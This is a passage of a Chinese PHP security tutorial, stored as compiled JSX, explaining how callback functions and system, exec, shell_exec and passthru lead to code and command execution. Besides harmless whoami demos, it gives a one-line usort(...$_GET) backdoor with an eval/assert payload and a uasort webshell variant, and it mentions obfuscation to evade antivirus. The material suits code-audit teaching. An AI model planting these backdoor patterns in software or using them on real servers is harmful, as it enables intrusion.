28\u53ef\u4ee5\u8fd9\u4e48\u76f4\u767d\u7684\u89e3\u91ca\u4e00\u4e0b\u3002\u4f60\u672c\u6765\u6709\u4e00\u4e2a\u6570\u7ec4\uff0c\u7136\u540e\u6211\u901a\u8fc7",(0,r.jsx)(n.code,{children:"array_map"}),"\u51fd\u6570\u5c06\u4f60\u8fd9\u4e2a\u6570\u7ec4\u5f53\u4f5c\u53c2\u6570\u4f20\u5165\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u6570\u7ec4\u3002\u89c1\u4e0b\u56fe\u3002"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648343.png",alt:"img"})}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    $old_array = array(1, 2, 3, 4, 5);\n    function func($arg){\n        return $arg * $arg;\n    }\n    $new_array = array_map('func',$old_array);\n    var_dump($new_array);\n?>\n    \n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\narray(5) {\n  [0]=>\n  int(1)\n  [1]=>\n  int(4)\n  [2]=>\n  int(9)\n  [3]=>\n  int(16)\n  [4]=>\n  int(25)\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u901a\u8fc7\u4e0a\u8ff0\u4ee3\u7801\uff0c\u6211\u4eec\u5927\u6982\u77e5\u9053\u8fd9\u4e2a\u51fd\u6570\u5c31\u662f\u8c03\u7528\u56de\u8c03\u51fd\u6570\uff08\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\uff09\u6765\u5b9e\u73b0\u5bf9\u73b0\u6709\u6570\u7ec4\u7684\u64cd\u4f5c\uff0c\u4ece\u800c\u5f97\u5230\u4e00\u4e2a\u65b0\u7684\u6570\u7ec4\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u4e48\u529f\u80fd\u6211\u77e5\u9053\u4e86\uff0c\u53ef\u662f\u8fd9\u4e2a\u548c\u4ee3\u7801\u6267\u884c\u6709\u4ec0\u4e48\u5173\u7cfb\u5462\uff1f\u5982\u4f55\u80fd\u591f\u5229\u7528\u8fd9\u4e2a\u51fd\u6570\u6267\u884c\u4ee3\u7801\u5462\uff1f\u4e14\u770b\u4e0b\u9762\u6240\u793a\u4ee3\u7801\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    $func = 'system';\n    $cmd = 'whoami';\n    $old_array[0] = $cmd;\n    $new_array = array_map($func,$old_array);\n    var_dump($new_array);\n?>\n    \n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\ndesktop-m61j5j6\\admin\narray(1) {\n  [0]=>\n  string(21) \"desktop-m61j5j6\\admin\"\n}\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u6bb5\u4ee3\u7801\u5c31\u662f\uff0c\u901a\u8fc7",(0,r.jsx)(n.code,{children:"array_map()"}),"\u8fd9\u4e2a\u51fd\u6570\uff0c\u6765\u8c03\u7528\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\uff0c\u800c\u7528\u6237\u8fd9\u91cc\u7684\u56de\u8c03\u51fd\u6570\u5176\u5b9e\u5c31\u662f",(0,r.jsx)(n.code,{children:"system"}),"\u51fd\u6570\uff0c\u90a3\u4e48\u5c31\u76f8\u5f53\u4e8e\u6211\u4eec\u7528",(0,r.jsx)(n.code,{children:"system"}),"\u51fd\u6570\u6765\u5bf9\u65e7\u6570\u7ec4\u8fdb\u884c\u64cd\u4f5c\uff0c\u5f97\u5230\u65b0\u7684\u6570\u7ec4\uff0c\u90a3\u4e48\u8fd9\u4e2a\u65b0\u7684\u6570\u7ec4\u7684\u7ed3\u679c\u5c31\u662f\u6211\u4eec\u60f3\u8981\u7684\u547d\u4ee4\u6267\u884c\u7684\u7ed3\u679c\u4e86\u3002"]}),"\n",(0,r.jsx)(n.h4,{id:"call_user_func",children:"call_user_func()"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"call_user_func()"}),"\u662f\u628a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f5c\u4e3a\u56de\u8c03\u51fd\u6570\u8c03\u7528"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"call_user_func( callable $callback[, mixed $parameter[, mixed $...]] ) : mixed\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-3",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.p,{children:["\u7b2c\u4e00\u4e2a\u53c2\u6570",(0,r.jsx)(n.code,{children:"callback"}),"\u662f\u88ab\u8c03\u7528\u7684\u56de\u8c03\u51fd\u6570\uff0c\u5176\u4f59\u53c2\u6570\u662f\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u3002"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"callback\uff1a\u5373\u5c06\u88ab\u8c03\u7528\u7684\u56de\u8c03\u51fd\u6570"}),"\n",(0,r.jsx)(n.li,{children:"parameter\uff1a\u4f20\u5165\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u4e2a\u51fd\u6570\u8fd8\u662f\u975e\u5e38\u597d\u7406\u89e3\u7684\uff0c\u770b\u4e00\u6bb5\u7b80\u5355\u7684\u793a\u4f8b\u4ee3\u7801"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    function callback($a,$b){\n        echo $a . \"\\n\";\n        echo $b;\n    }\n    call_user_func('callback','\u6211\u662f\u53c2\u65701','\u6211\u662f\u53c2\u65702');\n?>\n\n\n\u6267\u884c\u7ed3\u679c\u2014\u2014>\n\u6211\u662f\u53c2\u6570\u6211\u662f\u53c2\u6570\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u53ef\u4ee5\u770b\u5230\u6b64\u51fd\u6570\u4f5c\u7528\u5c31\u662f\u8c03\u7528\u4e86\u7b14\u8005\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\u3002\u90a3\u4e48\u8fd9\u4e2a\u5982\u4f55\u5b9e\u73b0\u4ee3\u7801\u6267\u884c\u5462\uff1f\u597d\u8bf4\uff0c\u4f60\u5728\u524d\u9762\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\u4e2d\u52a0\u5165\u80fd\u6267\u884c\u547d\u4ee4\u7684\u4ee3\u7801\u4e0d\u4e45\u53ef\u4ee5\u4ee3\u7801\u6267\u884c\u4e86\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u793a\u4f8b\u4ee3\u7801\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    function callback($a){\n        return system($a);\n    }\n    $cmd = 'whoami';\n    call_user_func('callback',$cmd);\n?>\n\n\u6267\u884c\u7ed3\u679c\u2014\u2014>\ndesktop-m61j5j6\\admin\n"})}),"\n",(0,r.jsx)(n.h4,{id:"call_user_func_array",children:"call_user_func_array()"}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u4e2a\u51fd\u6570\u540d\u79f0\u8ddf\u4e0a\u6ca1\u4ec0\u4e48\u5927\u7684\u5dee\u522b\uff0c\u552f\u4e00\u7684\u533a\u522b\u5c31\u5728\u4e8e\u53c2\u6570\u7684\u4f20\u9012\u4e0a\uff0c\u8fd9\u4e2a\u51fd\u6570\u662f\u628a\u4e00\u4e2a\u6570\u7ec4\u4f5c\u4e3a\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"call_user_func_array( callable $callback, array $param_arr) : mixed\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-4",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"callback\uff1a\u88ab\u8c03\u7528\u7684\u56de\u8c03\u51fd\u6570"}),"\n",(0,r.jsx)(n.li,{children:"param_arr\uff1a\u8981\u88ab\u4f20\u5165\u56de\u8c03\u51fd\u6570\u7684\u6570\u7ec4\uff0c\u8fd9\u4e2a\u6570\u7ec4\u9700\u8981\u662f\u7d22\u5f15\u6570\u7ec4"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u793a\u4f8b\u4ee3\u7801"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    function callback($a,$b){\n        echo $a . \"\\n\";\n        echo $b;\n    }\n\t$onearray = array('\u6211\u662f\u53c2\u65701','\u6211\u662f\u53c2\u65702');\n    call_user_func_array('callback',$onearray);\n?>\n\n\n\u6267\u884c\u7ed3\u679c\u2014\u2014>\n\u6211\u662f\u53c2\u6570\u6211\u662f\u53c2\u6570```\n\n\n\u793a\u4f8b\u4ee3\u7801\uff1a\n\n```php\n<?php\n    function callback($a){\n        return system($a);\n    }\n    $cmd = array('whoami');\n    call_user_func_array('callback',$cmd);\n?>\n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\ndesktop-m61j5j6\\admin\n"})}),"\n",(0,r.jsx)(n.h4,{id:"array_filter",children:"array_filter()"}),"\n",(0,r.jsx)(n.p,{children:"\u7528\u56de\u8c03\u51fd\u6570\u8fc7\u6ee4\u6570\u6570\u7ec4\u4e2d\u7684\u5355\u5143"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"array_filter( array $array[, callable $callback[, int $flag = 0]] ) : array\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4f9d\u6b21\u5c06",(0,r.jsx)(n.code,{children:"array"}),"\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u503c\u4f20\u5230",(0,r.jsx)(n.code,{children:"callback"}),"\u51fd\u6570\u3002\u5982\u679c",(0,r.jsx)(n.code,{children:"callback"}),"\u51fd\u6570\u8fd4\u56de",(0,r.jsx)(n.code,{children:"true"}),"\uff0c\u5219",(0,r.jsx)(n.code,{children:"array"}),"\u6570\u7ec4\u7684\u5f53\u524d\u503c\u4f1a\u88ab\u5305\u542b\u5728\u8fd4\u56de\u7684\u7ed3\u679c\u6570\u7ec4\u4e2d\u3002\u6570\u7ec4\u7684\u952e\u540d\u4fdd\u7559\u4e0d\u53d8\u3002"]}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-5",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"array\uff1a\u8981\u5faa\u73af\u7684\u6570\u7ec4"}),"\n",(0,r.jsxs)(n.li,{children:["callback\uff1a\u4f7f\u7528\u7684\u56de\u8c03\u51fd\u6570\u3002\u5982\u679c\u6ca1\u6709\u63d0\u4f9b",(0,r.jsx)(n.code,{children:"callback"}),"\u51fd\u6570\uff0c\u5c06\u5220\u9664",(0,r.jsx)(n.code,{children:"array"}),"\u4e2d\u6240\u6709\u7b49\u503c\u4e3aFALSE\u7684\u6761\u76ee\u3002"]}),"\n",(0,r.jsxs)(n.li,{children:["flag\uff1a\u51b3\u5b9a",(0,r.jsx)(n.code,{children:"callback"}),"\u63a5\u6536\u7684\u53c2\u6570\u5f62\u5f0f"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff08\u8fd9\u91cc\u770b\u5b98\u65b9\u7684\u5c31\u884c\uff0c\u5f88\u8be6\u7ec6\uff09\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\nfunction odd($var)\n{\n    // returns whether the input integer is odd\n    return($var & 1);\n}\n\nfunction even($var)\n{\n    // returns whether the input integer is even\n    return(!($var & 1));\n}\n\n$array1 = array("a"=>1, "b"=>2, "c"=>3, "d"=>4, "e"=>5);\n$array2 = array(6, 7, 8, 9, 10, 11, 12);\n\necho "Odd :\\n";\nprint_r(array_filter($array1, "odd"));\necho "Even:\\n";\nprint_r(array_filter($array2, "even"));\n?> \n    \n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\nOdd :\nArray\n(\n    [a] =>     [c] =>     [e] => )\nEven:\nArray\n(\n    [0] =>     [2] =>     [4] =>     [6] => )\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u4ece\u4e0a\u9762\u4ee3\u7801\u6211\u4eec\u77e5\u9053\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f5c\u7528\u5176\u5b9e\u5c31\u662f\u8fc7\u6ee4\uff0c\u53ea\u4e0d\u8fc7\u8fd9\u4e2a\u8fc7\u6ee4\u8c03\u7528\u7684\u662f\u51fd\u6570\uff0c\u800c\u88ab\u8fc7\u6ee4\u7684\u662f\u4f20\u5165\u7684\u53c2\u6570\u3002\u5230\u8fd9\u91cc\u4f60\u5fc3\u91cc\u6709\u6ca1\u6709\u4ee3\u7801\u6267\u884c\u7684\u96cf\u5f62\u4e86\uff1f"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    $cmd='whoami';\n    $array1=array($cmd);\n    $func ='system';\n    array_filter($array1,$func);\n?>\n    \n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\ndesktop-m61j5j6\\admin\n"})}),"\n",(0,r.jsx)(n.h4,{id:"usort",children:"usort()"}),"\n",(0,r.jsx)(n.p,{children:"\u4f7f\u7528\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u6bd4\u8f83\u51fd\u6570\u5bf9\u6570\u7ec4\u4e2d\u7684\u503c\u8fdb\u884c\u6392\u5e8f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"usort( array &$array, callable $value_compare_func) : bool\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-6",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"array\uff1a\u8f93\u5165\u7684\u6570\u7ec4"}),"\n",(0,r.jsx)(n.li,{children:"cmp_function\uff1a\u5728\u7b2c\u4e00\u4e2a\u53c2\u6570\u5c0f\u4e8e\u3001\u7b49\u4e8e\u6216\u5927\u4e8e\u7b2c\u4e8c\u4e2a\u53c2\u6570\u65f6\uff0c\u8be5\u6bd4\u8f83\u51fd\u6570\u5fc5\u987b\u76f8\u5e94\u5730\u8fd4\u56de\u4e00\u4e2a\u5c0f\u4e8e\u3001\u7b49\u4e8e\u6216\u5927\u4e8e0\u7684\u6570"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    function func($a,$b){\n        return ($a<$b)?1:-1;\n    }\n    $onearray=array(1,3,2,5,9);\n    usort($onearray, 'func');\n    print_r($onearray);\n?>\n\n\u6267\u884c\u7ed3\u679c\u2014\u2014>\nArray\n(\n    [0] =>     [1] =>     [2] =>     [3] =>     [4] => )\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u53ef\u89c1\u5b9e\u73b0\u4e86\u9006\u5e8f\u7684\u529f\u80fd\u3002\u90a3\u4e48\u5018\u82e5\u6211\u4eec\u628a\u56de\u8c03\u51fd\u6570\u8bbe\u8ba1\u6210\u80fd\u591f\u6267\u884c\u4ee3\u7801\u7684\u51fd\u6570\uff0c\u662f\u4e0d\u662f\u5c31\u53ef\u4ee5\u6267\u884c\u6211\u4eec\u60f3\u8981\u7684\u4ee3\u7801\u4e86\u5462\uff1f"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php \n    usort(...$_GET);\n?>\n\npayload: 1.php?1[0]=0&1[1]=eval($_POST['x'])&2=assert\nPOST\u4f20\u53c2: x=phpinfo();\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"usort"}),"\u7684\u53c2\u6570\u901a\u8fc7GET\u4f20\u53c2\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e5f\u5c31\u662f",(0,r.jsx)(n.code,{children:"$_GET[0]"}),"\uff0c\u968f\u4fbf\u4f20\u5165\u4e00\u4e2a\u6570\u5b57\u5373\u53ef\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e5f\u5c31\u662f",(0,r.jsx)(n.code,{children:"$_GET[1]"}),"\u662f\u6211\u4eec\u8981\u8c03\u7528\u7684\u51fd\u6570\u540d\u79f0\uff0c\u8fd9\u91cc\u91c7\u7528\u7684\u662f",(0,r.jsx)(n.code,{children:"assert"}),"\u51fd\u6570\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u6267\u884c\u7ed3\u679c\uff1a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648344.png",alt:"img"})}),"\n",(0,r.jsx)(n.h4,{id:"uasort",children:"uasort()"}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u4e2a\u8ddf\u4e0a\u4e00\u4e2a\u5dee\u4e0d\u591a\uff0c\u533a\u522b\u4e0d\u662f\u5f88\u5927\u3002\u6b64\u51fd\u6570\u5bf9\u6570\u7ec4\u6392\u5e8f\u5e76\u4fdd\u6301\u7d22\u5f15\u548c\u5355\u5143\u4e4b\u95f4\u7684\u5173\u8054\u3002\u4e5f\u5c31\u662f\u8bf4\u4f60\u8fd9\u4e2a\u6392\u5b8c\u5e8f\u4e4b\u540e\u5462\uff0c\u5b83\u539f\u6765\u5bf9\u5e94\u7684\u7d22\u5f15\u4e5f\u4f1a\u76f8\u5e94\u6539\u53d8\uff0c\u7c7b\u4f3c\u4e8e\u201c\u7ed1\u5b9a\u201d\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"uasort( array &$array, callable $value_compare_func) : bool\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-7",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"array\uff1a\u8f93\u5165\u7684\u6570\u7ec4"}),"\n",(0,r.jsx)(n.li,{children:"value_compare_func\uff1a\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u51fd\u6570"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u91cc\u7528\u7684\u4ecd\u7136\u5b98\u65b9\u4f8b\u5b50\uff08\u6bd4\u8f83\u597d\u7406\u89e3\uff09"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n// Comparison function\nfunction cmp($a, $b) {\n    if ($a == $b) {\n        return 0;\n    }\n    return ($a < $b) ? -1 : 1;\n}\n\n// Array to be sorted\n$array = array('a' => 4, 'b' => 8, 'c' => -1, 'd' => -9, 'e' => 2, 'f' => 5, 'g' => 3, 'h' => -4);\nprint_r($array);\n\n// Sort and print the resulting array\nuasort($array, 'cmp');\nprint\n?>\n       \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\nArray\n(\n    [a] =>     [b] =>     [c] => -    [d] => -    [e] =>     [f] =>     [g] =>     [h] => -)\nArray\n(\n    [d] => -    [h] => -    [c] => -    [e] =>     [g] =>     [a] =>     [f] =>     [b] => )\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u53d1\u73b0\uff0c\u5728\u6392\u5b8c\u5e8f\u4e4b\u540e\u7d22\u5f15\u4e5f\u8ddf\u7740\u503c\u7684\u4f4d\u7f6e\u53d8\u5316\u800c\u53d8\u5316\u4e86\u3002\u90a3\u4e48\u4ee3\u7801\u6267\u884c\u7684\u793a\u4f8b\u4ee3\u7801\u5176\u5b9e\u4e5f\u548c\u4e0a\u4e00\u4e2a\u5dee\u4e0d\u591a\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n\t$a = $_GET['a'];\n\t$onearray = array('Ameng', $_POST['x']);\n\tuasort($onearray, $a);\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6267\u884c\u7ed3\u679c\uff1a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648345.png",alt:"img"})}),"\n",(0,r.jsx)(n.h4,{id:"\u603b\u7ed3",children:"\u603b\u7ed3"}),"\n",(0,r.jsx)(n.p,{children:"\u770b\u5b8c\u8fd9\u91cc\u4e0d\u77e5\u9053\u4f60\u5bf9\u4ee3\u7801\u5ba1\u8ba1\u4e2d\u7684\u4ee3\u7801\u6267\u884c\u90e8\u5206\u662f\u5426\u6709\u53e6\u4e00\u79cd\u60f3\u6cd5\uff1f\u6211\u7684\u60f3\u6cd5\u5c31\u662f\u8fd9\u4e2a\u662f\u548c\u540e\u95e8\u8054\u7cfb\u5728\u4e00\u8d77\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5f88\u591a\u51fd\u6570\u90fd\u5177\u6709\u6784\u9020\u6267\u884c\u547d\u4ee4\u7684\u6761\u4ef6\uff0c\u800c\u4e14\u5176\u4e2d\u5f88\u591a\u51fd\u6570\u4e5f\u7684\u786e\u88ab\u7528\u5728\u540e\u95e8\u4e2d\uff0c\u7279\u522b\u50cf\u540e\u9762\u51e0\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u5728\u540e\u95e8\u4e2d\u66f4\u662f\u5e38\u89c1\u3002\u5f53\u7136\u8fd9\u4e9b\u540e\u95e8\u51fd\u6570\u4e5f\u65e9\u5df2\u88ab\u5b89\u5168\u5382\u5546\u76ef\u4f4f\uff0c\u6240\u4ee5\u5927\u90e8\u5206\u5df2\u7ecf\u65e0\u6cd5\u76f4\u63a5\u514d\u6740\uff0c\u6240\u4ee5\u60f3\u8981\u514d\u6740\u5c31\u9700\u8981\u7ed3\u5408\u5176\u4ed6\u59ff\u52bf\uff0c\u6bd4\u5982\u66ff\u6362\u3001\u62fc\u63a5\u3001\u52a0\u5bc6\u7b49\u7b49\u3002\u4f46\u662f\u8fd9\u4e9b\u77e5\u8bc6\u5728CTF\u4e2d\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u51fa\u73b0\u7684\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u547d\u4ee4\u6267\u884c",children:"\u547d\u4ee4\u6267\u884c"}),"\n",(0,r.jsx)(n.p,{children:"\u8bf4\u5b8c\u4ee3\u7801\u6267\u884c\uff0c\u6211\u4eec\u518d\u6765\u770b\u770b\u547d\u4ee4\u6267\u884c\u3002\u5e38\u89c1\u7684\u547d\u4ee4\u6267\u884c\u51fd\u6570\u6709\u54ea\u4e9b\u5462\uff1f"}),"\n",(0,r.jsx)(n.h4,{id:"system",children:"system()"}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u4e2a\u51fd\u6570\u60f3\u5fc5\u6211\u4eec\u90fd\u662f\u6bd4\u8f83\u719f\u6089\u7684\uff0c\u6b64\u51fd\u6570\u5c31\u662f\u6267\u884c\u5916\u90e8\u6307\u4ee4\uff0c\u5e76\u4e14\u663e\u793a\u8f93\u51fa"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"system( string $command[, int &$return_var] ) : string\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-8",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"command\uff1a\u5fc5\u9700\u3002\u8981\u6267\u884c\u7684\u547d\u4ee4"}),"\n",(0,r.jsx)(n.li,{children:"return_var\uff1a\u53ef\u9009\u3002\u82e5\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u53c2\u6570\uff0c\u90a3\u4e48\u547d\u4ee4\u6267\u884c\u540e\u7684\u8fd4\u56de\u72b6\u6001\u5c31\u4f1a\u88ab\u653e\u5230\u8fd9\u4e2a\u53d8\u91cf\u4e2d"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u793a\u4f8b\u4ee3\u7801\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    $cmd = 'whoami';\n    system($cmd);\n?>\n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\ndesktop-m61j5j6\\admin\n"})}),"\n",(0,r.jsx)(n.h4,{id:"exec",children:"exec()"}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u4e2a\u5176\u5b9e\u548c\u4e0a\u9762",(0,r.jsx)(n.code,{children:"system"}),"\u51fd\u6570\u6ca1\u6709\u592a\u5927\u533a\u522b\uff0c\u90fd\u662f\u6267\u884c\u5916\u90e8\u7a0b\u5e8f\u6307\u4ee4\uff0c\u53ea\u4e0d\u8fc7\u8fd9\u4e2a\u51fd\u6570\u591a\u4e86\u4e00\u4e2a\u53c2\u6570\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u628a\u547d\u4ee4\u6267\u884c\u8f93\u51fa\u7684\u7ed3\u679c\u4fdd\u5b58\u5230\u4e00\u4e2a\u6570\u7ec4\u4e2d\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"exec( string $command[, array &$output[, int &$return_var]] ) : string\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-9",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"command\uff1a\u5fc5\u9700\u3002\u8981\u6267\u884c\u7684\u547d\u4ee4"}),"\n",(0,r.jsx)(n.li,{children:"output\uff1a\u53ef\u9009\u3002\u5982\u679c\u8bbe\u7f6e\u4e86\u6b64\u53c2\u6570\uff0c\u90a3\u4e48\u547d\u4ee4\u6267\u884c\u7684\u7ed3\u679c\u5c06\u4f1a\u4fdd\u5b58\u5230\u6b64\u6570\u7ec4\u3002"}),"\n",(0,r.jsx)(n.li,{children:"return_var\uff1a\u53ef\u9009\u3002\u547d\u4ee4\u6267\u884c\u7684\u8fd4\u56de\u72b6\u6001\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n$cmd = 'whoami';\necho exec($cmd);\n?>\n\n\u6267\u884c\u7ed3\u679c\u2014\u2014>\ndesktop-m61j5j6\\admin\n"})}),"\n",(0,r.jsx)(n.h4,{id:"shell_exec",children:"shell_exec()"}),"\n",(0,r.jsxs)(n.p,{children:["\u6b64\u51fd\u6570\u901a\u8fc7shell\u73af\u5883\u6267\u884c\u547d\u4ee4\uff0c\u5e76\u4e14\u5c06\u5b8c\u6574\u7684\u8f93\u51fa\u4ee5\u5b57\u7b26\u4e32\u7684\u65b9\u5f0f\u8fd4\u56de\u3002\u5982\u679c\u6267\u884c\u8fc7\u7a0b\u4e2d\u53d1\u751f\u9519\u8bef\u6216\u8005\u8fdb\u7a0b\u4e0d\u4ea7\u751f\u8f93\u51fa\uff0c\u90a3\u4e48\u5c31\u8fd4\u56de",(0,r.jsx)(n.code,{children:"NULL"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"shell_exec( string $cmd) : string\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-10",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"cmd\uff1a\u8981\u6267\u884c\u7684\u547d\u4ee4"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n$cmd = 'whoami';\necho shell_exec($cmd);\n?>\n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\ndesktop-m61j5j6\\admin\n"})}),"\n",(0,r.jsx)(n.h4,{id:"passthru",children:"passthru()"}),"\n",(0,r.jsxs)(n.p,{children:["\u6267\u884c\u5916\u90e8\u7a0b\u5e8f\u5e76\u4e14\u663e\u793a\u539f\u59cb\u8f93\u51fa\u3002\u65e2\u7136\u6211\u4eec\u5df2\u7ecf\u6709\u6267\u884c\u547d\u4ee4\u7684\u51fd\u6570\u4e86\uff0c\u90a3\u4e48\u8fd9\u4e2a\u51fd\u6570\u6211\u4eec\u4ec0\u4e48\u65f6\u5019\u4f1a\u7528\u5230\u5462\uff1f\u5f53\u6240\u6267\u884c\u7684Unix\u547d\u4ee4\u8f93\u51fa\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u5e76\u4e14\u9700\u8981\u76f4\u63a5\u4f20\u9001\u5230\u6d4f\u89c8\u5668\u7684\u65f6\u5019\uff0c\u9700\u8981\u7528\u6b64\u51fd\u6570\u6765\u66ff\u4ee3",(0,r.jsx)(n.code,{children:"exec()"}),"\u6216",(0,r.jsx)(n.code,{children:"system()"}),"\u51fd\u6570"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"passthru( string $command[, int 